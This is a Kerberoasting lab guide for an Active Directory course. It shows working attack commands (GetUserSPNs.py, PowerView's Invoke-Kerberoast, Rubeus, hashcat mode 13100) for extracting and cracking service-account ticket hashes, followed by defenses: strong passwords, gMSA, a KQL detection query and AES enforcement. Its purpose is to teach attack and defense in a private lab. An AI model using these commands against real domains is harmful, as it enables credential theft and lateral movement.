# 🎯 Lab 03 — Kerberoasting Simulation

> **Goal:** Perform a full Kerberoasting attack in your safe lab environment — from reconnaissance to password cracking — then implement the defenses and verify they work.

---

## ⚠️ Lab Ethics Notice

```
┌────────────────────────────────────────────────────────────────────┐
│  ⚠️  IMPORTANT: AUTHORIZED LAB USE ONLY                            │
│                                                                    │
│  This lab is for EDUCATIONAL purposes in YOUR OWN lab environment. │
│  Never perform these techniques on systems you don't own or         │
│  have explicit written permission to test.                          │
│                                                                    │
│  Understanding attacks = building better defenses.                 │
│  This is the mindset of every good security engineer.              │
└────────────────────────────────────────────────────────────────────┘
```

---

## 🎯 What is Kerberoasting?

```
THE ATTACK IN PLAIN ENGLISH:
──────────────────────────────────────────────────────────────────

  1. Every service in AD (SQL, IIS, etc.) has a Service Principal
     Name (SPN) — like a name tag: "MSSQLSvc/server01:1433"

  2. Any domain user can request a Kerberos ticket for ANY service
     (this is normal, by design)

  3. The ticket is ENCRYPTED with the service account's password hash

  4. Attacker gets the ticket → takes it offline → cracks the hash
     No lockout! No noise! Completely offline!

  5. If service account has weak password → cracked in seconds!
     If strong password → takes years / never cracked


  ANALOGY:
  ─────────────────────────────────────────────────────────────────
  Imagine you can legally take a combination lock from any door.
  You take it home, and try every possible combination offline.
  Nobody knows you're trying.
  If the combination is "1234" → you're in immediately.
  If it's a 20-digit random code → you never get in.
```

---

## 🗺️ Full Attack Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│                    KERBEROASTING ATTACK CHAIN                        │
│                                                                      │
│  STEP 1: RECON          STEP 2: REQUEST         STEP 3: CRACK        │
│  ──────────────         ────────────────         ───────────────     │
│                                                                      │
│  Find accounts with     Request Kerberos         Crack offline       │
│  SPNs set               service ticket           with hashcat        │
│                                                                      │
│  ┌────────────────┐     ┌────────────────┐       ┌──────────────┐   │
│  │  Any domain    │     │  Kerberos TGS  │       │  hashcat     │   │
│  │  user account  │────►│  request for   │──────►│  -m 13100    │   │
│  │                │     │  svc-sql SPN   │       │              │   │
│  │  GetSPNs.py    │     │                │       │  wordlist +  │   │
│  └────────────────┘     │  DC issues     │       │  rules       │   │
│         │               │  RC4 ticket    │       └──────────────┘   │
│         ▼               └────────────────┘              │            │
│  svc-sql found!                │                        ▼            │
│  SPN: MSSQLSvc/...             ▼                  "Service@2024"     │
│                         $krb5tgs$23$*...*          CRACKED! ✅        │
│                         (the hash to crack)                          │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 🐧 Attack Phase — From Kali Linux

### Step 1: Reconnaissance — Find Kerberoastable Accounts

```
ON KALI LINUX (Attacker VM - 192.168.10.99):
──────────────────────────────────────────────────────────────────

  # Install Impacket if not already there
  pip3 install impacket


  METHOD A: GetUserSPNs.py (Impacket)
  ─────────────────────────────────────────────────────────────────
  # Find all accounts with SPNs (as domain user alice)
  GetUserSPNs.py lab.local/alice:Password123! -dc-ip 192.168.10.10

  EXPECTED OUTPUT:
  ────────────────────────────────────────────────────────────────
  ServicePrincipalName            Name     MemberOf  PasswordLastSet
  ─────────────────────────────   ──────   ────────  ───────────────
  MSSQLSvc/SERVER01.lab.local:1433  svc-sql           2024-01-15

  → Found svc-sql with SPN! This is our target.


  METHOD B: PowerShell (from WIN10-CLIENT as alice)
  ─────────────────────────────────────────────────────────────────
  # Import PowerView (download from PowerSploit)
  Import-Module PowerView.ps1

  # Find Kerberoastable accounts
  Get-DomainUser -SPN | Select samaccountname, serviceprincipalname

  # More detailed
  Invoke-Kerberoast -OutputFormat Hashcat | Select Hash | Out-File hashes.txt
```

### Step 2: Request the Ticket and Extract Hash

```
  METHOD A: GetUserSPNs.py with -request flag
  ─────────────────────────────────────────────────────────────────
  # Request ticket AND extract the hash in one command
  GetUserSPNs.py lab.local/alice:Password123! \
    -dc-ip 192.168.10.10 \
    -request \
    -outputfile kerberoast_hashes.txt

  # Check the file
  cat kerberoast_hashes.txt

  OUTPUT (this is the hash to crack):
  ─────────────────────────────────────────────────────────────────
  $krb5tgs$23$*svc-sql$LAB.LOCAL$MSSQLSvc/SERVER01.lab.local:1433*
  $9a8c7b6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9...
  (very long hash string)

  → This is the Kerberos TGS hash. Now crack it offline!


  METHOD B: Rubeus (from Windows, if you have access)
  ─────────────────────────────────────────────────────────────────
  # Download Rubeus.exe to WIN10-CLIENT
  .\Rubeus.exe kerberoast /outfile:hashes.txt

  # Shows same hash format
```

### Step 3: Crack the Hash

```
  CRACK WITH HASHCAT (on Kali or your host machine):
  ─────────────────────────────────────────────────────────────────
  # hashcat mode 13100 = Kerberos TGS-REP
  # Use rockyou.txt wordlist (pre-installed on Kali)

  # Basic wordlist attack
  hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

  # With rules (much more powerful)
  hashcat -m 13100 kerberoast_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule


  EXPECTED OUTPUT:
  ─────────────────────────────────────────────────────────────────
  $krb5tgs$23$*svc-sql...*:Service@2024
                            ──────────────
                            PASSWORD FOUND!

  Status: Cracked in ~3 seconds (weak password!)
  Session: lab-kerberoast
  Speed: 1.2 MH/s (1.2 million hashes/second)

  ⚡ "Service@2024" was cracked in seconds because:
     It's in rockyou.txt or easily derived by rules
     This is exactly why service account password hygiene matters!
```

---

## 🛡️ Defense Phase — Harden Against Kerberoasting

Now switch hats. **You're the defender.** Fix what you just broke.

### Defense 1: Use Strong Passwords for Service Accounts

```
  WEAK (crackable in seconds):     STRONG (never crackable):
  ─────────────────────────────    ──────────────────────────────────
  Service@2024                     J#9mK!vR2$nL8@qX5wZ3^pY7&hN4*cE1
  Password123!                     (25+ random chars)
  SQLservice2023                   Even better: 64+ char random string

  CHANGE THE PASSWORD IN LAB:
  ─────────────────────────────────────────────────────────────────
  # Generate a strong random password
  $newPass = [System.Web.Security.Membership]::GeneratePassword(64, 20)
  Write-Host "New password: $newPass"

  # Set it on the service account
  Set-ADAccountPassword -Identity svc-sql `
    -Reset `
    -NewPassword (ConvertTo-SecureString $newPass -AsPlainText -Force)

  # Now try to Kerberoast again → hash won't crack!
  GetUserSPNs.py lab.local/alice:Password123! -dc-ip 192.168.10.10 -request
  # You'll still get the hash, but hashcat will NEVER crack it
```

### Defense 2: Use Managed Service Accounts (gMSA)

```
  gMSA = Group Managed Service Account
  Windows auto-rotates the password (240-char, every 30 days)
  Never stored anywhere you can steal it!

  CREATE gMSA IN LAB:
  ─────────────────────────────────────────────────────────────────
  # Create the KDS Root Key first (required, one-time per domain)
  Add-KdsRootKey -EffectiveImmediately

  # Wait 10 hours in production (or use -EffectiveTime for lab)
  # In lab: cheat with effective immediately flag above

  # Create gMSA
  New-ADServiceAccount `
    -Name "gmsa-sql" `
    -DNSHostName "gmsa-sql.lab.local" `
    -PrincipalsAllowedToRetrieveManagedPassword "SERVER01$" `
    -ServicePrincipalNames "MSSQLSvc/SERVER01.lab.local:1433"

  # Now even if someone Kerberoasts this account:
  # The ticket hash represents a 240-char random password
  # IMPOSSIBLE to crack → Defense works!
```

### Defense 3: Detect with Event IDs

```
  DETECTION QUERY (KQL for Sentinel / Event Viewer):
  ─────────────────────────────────────────────────────────────────
  # Kerberoasting signature: RC4 encrypted TGS tickets
  # Normal traffic uses AES-256 (0x12) or AES-128 (0x11)
  # Kerberoasting uses RC4 (0x17) for crackability

  SecurityEvent
  | where EventID == 4769
  | where TicketEncryptionType == "0x17"   // RC4 = suspicious!
  | where ServiceName !endswith "$"         // Exclude machine accounts
  | where AccountName !endswith "$"         // Exclude machine accounts
  | summarize Count = count() by AccountName, ServiceName, IpAddress
  | where Count > 3                         // More than 3 = spray
  | order by Count desc

  ALERT: "Kerberoasting - Multiple RC4 TGS requests"


  ALSO CHECK IN EVENT VIEWER ON DC:
  ─────────────────────────────────────────────────────────────────
  Security Log → Event ID 4769
  Filter: Ticket Encryption Type = 0x17
  Multiple events from same user = Kerberoasting attempt
```

### Defense 4: Mark Accounts as Protected

```
  KERBEROS AES ENFORCEMENT:
  ─────────────────────────────────────────────────────────────────
  # Force AES encryption for service accounts
  # This makes Kerberoasting harder (AES hashes don't crack well)

  Set-ADUser -Identity svc-sql `
    -KerberosEncryptionType AES128,AES256

  # Now when attacker requests ticket:
  # They get AES-256 encrypted ticket
  # hashcat -m 19700 (AES) is MUCH harder to crack than RC4

  # Even better: Enable "This account supports Kerberos AES"
  # AND use strong password = double defense
```

---

## 📊 Attack vs Defense Summary

```
┌─────────────────────────────────────────────────────────────────────┐
│              KERBEROASTING: ATTACK VS DEFENSE                       │
├────────────────────────────┬────────────────────────────────────────┤
│  ATTACK STEP               │  DEFENSE                               │
├────────────────────────────┼────────────────────────────────────────┤
│ Find SPNs                  │ Audit: Who has SPNs? Remove unused ones │
│ GetUserSPNs.py             │ Minimum SPNs = minimum attack surface   │
├────────────────────────────┼────────────────────────────────────────┤
│ Request TGS (RC4)          │ Enforce AES encryption for service accts│
│ Kerberos ticket issued     │ Event 4769 + RC4 = alert!               │
├────────────────────────────┼────────────────────────────────────────┤
│ Crack hash offline         │ Strong passwords (25+ random chars)     │
│ hashcat -m 13100           │ gMSA = auto-rotating 240-char password  │
├────────────────────────────┼────────────────────────────────────────┤
│ Use cracked credentials    │ Monitor: New logons from svc accounts   │
│ Lateral movement           │ Least privilege for service accounts    │
└────────────────────────────┴────────────────────────────────────────┘
```

---

## ✅ Lab Checklist

```
KERBEROASTING LAB COMPLETE WHEN:
──────────────────────────────────────────────────────────────────
  ATTACK PHASE:
  □ Found svc-sql with SPN via GetUserSPNs.py
  □ Extracted the Kerberos TGS hash
  □ Cracked the hash with hashcat using rockyou.txt
  □ Verified cracked password matches actual svc-sql password

  DEFENSE PHASE:
  □ Changed svc-sql to strong 64-char password
  □ Attempted Kerberoast again → hashcat can't crack
  □ Created a gMSA account and verified SPN
  □ Enabled AES-only Kerberos for service account
  □ Created Sentinel/Event Viewer alert for 4769 + RC4

  BONUS:
  □ Use BloodHound to identify Kerberoastable accounts visually
    (covered in Lab 04)
```

---

**← Previous:** [02 - GPO Lab](./02-GPO-Lab.md)
**Next →** [04 - BloodHound Lab](./04-BloodHound-Lab.md)
